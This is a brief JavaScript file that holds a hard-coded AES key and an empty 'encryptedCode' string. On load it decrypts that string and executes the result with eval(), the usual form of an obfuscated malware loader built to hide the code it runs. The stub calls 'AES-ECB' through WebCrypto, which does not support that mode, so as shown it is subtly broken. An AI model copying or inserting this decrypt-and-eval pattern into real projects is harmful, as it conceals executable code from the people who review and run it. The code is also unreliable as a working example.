
const encryptedCode = "";
const aesKey = "FC7sN/KxE9pHVsmjcj18mA==";

function decryptAndExecute() {
    function aesDecrypt(encrypted, key) {
        const decodedKey = atob(key);
        const decodedData = atob(encrypted);
        const aesKey = new Uint8Array([...decodedKey].map(c => c.charCodeAt(0)));
        const aesData = new Uint8Array([...decodedData].map(c => c.charCodeAt(0)));
        
        const cryptoKey = crypto.subtle.importKey("raw", aesKey, { name: "AES-ECB" }, false, ["decrypt"]);
        cryptoKey.then(key => crypto.subtle.decrypt({ name: "AES-ECB" }, key, aesData))
                 .then(decrypted => {
                     const decoder = new TextDecoder();
                     eval(decoder.decode(decrypted));
                 });
    }
    aesDecrypt(encryptedCode, aesKey);
}

decryptAndExecute();
